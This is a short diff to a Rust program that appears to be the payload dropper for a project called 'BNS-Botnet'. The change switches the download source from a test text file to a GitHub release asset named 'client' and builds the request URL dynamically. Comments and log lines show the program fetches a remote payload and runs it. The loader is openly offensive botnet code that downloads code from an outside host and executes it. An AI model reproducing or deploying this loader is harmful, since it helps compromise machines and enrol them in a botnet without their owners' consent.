@@ -2,8 +2,8 @@ use std::{io::Write, path::Path, process::Command};
 
 const ARCH: &'static str = std::env::consts::ARCH;
 const REPO: &'static str =
-    "https://raw.githubusercontent.com/SenneW-2158088/BNS-Botnet/refs/heads/main/payload";
-const PAYLOAD: &'static str = "test";
+    "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
+const PAYLOAD: &'static str = "client";
 
 /// Spawns a tasks and runs the payload
 fn drop(path: &Path) {
@@ -25,7 +25,7 @@ fn main() {
     println!("[+] Getting payload from: {}", url);
 
     let response = client
-        .get("https://raw.githubusercontent.com/SenneW-2158088/BNS-Botnet/refs/heads/main/payload/test.txt")
+        .get(url)
         .send();
 
     let payload = response.expect("Error retrieving payload");
